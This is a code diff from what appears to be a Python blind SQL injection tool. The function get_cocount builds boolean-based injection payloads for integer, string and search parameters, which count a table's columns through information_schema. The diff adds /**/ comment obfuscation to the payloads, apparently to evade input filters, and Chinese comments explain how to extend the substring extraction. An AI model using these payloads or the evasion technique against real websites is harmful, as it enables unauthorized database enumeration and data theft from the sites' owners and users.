@@ -3,8 +3,7 @@
 
 import urllib
 from urllib import request
-from data import glovar, glofun
-
+from global_data import glovar, glofun
 
 
 def get_cocount(url=glovar.url3, cookie=False, type='search',
@@ -12,16 +11,16 @@ def get_cocount(url=glovar.url3, cookie=False, type='search',
     response_length = 0
 
 
-    hex_tbname=glofun.hex_convert(tbname)
+    hex_tbname= glofun.string_convert_to_hex(tbname)
 
 
     # 查数据库test中表的个数基础知识--这里的方法只使用与表的个数少于10的，要是多多于10的话substr(({sql}),2,1)要这样增加截取，或者substr(({sql}),1,2)
     if type == 'int':
-        payload = '+or+if((select+count(*)+from+information_schema.columns+where+table_name=' + hex_tbname + ')={cocount},1,0)'
+        payload = '+or/**/if((select+count(*)+from+information_schema/**/.columns+where+table_name=' + hex_tbname + ')={cocount},1,0)'
     elif type == 'string':
-        payload = '\'+or+if((select+count(*)+from+information_schema.columns+where+table_name=' + hex_tbname + ')={cocount},1,0)%23'
+        payload = '\'+or/**/if((select+count(*)+from+information_schema/**/.columns+where+table_name=' + hex_tbname + ')={cocount},1,0)%23'
     elif type == 'search':
-        payload = '%\'+or+if((select+count(*)+from+information_schema.columns+where+table_name=' + hex_tbname + ')={cocount},1,0)%23'
+        payload = '%\'+or/**/if((select+count(*)+from+information_schema/**/.columns+where+table_name=' + hex_tbname + ')={cocount},1,0)%23'
 
     for i in range(0, 30):
 
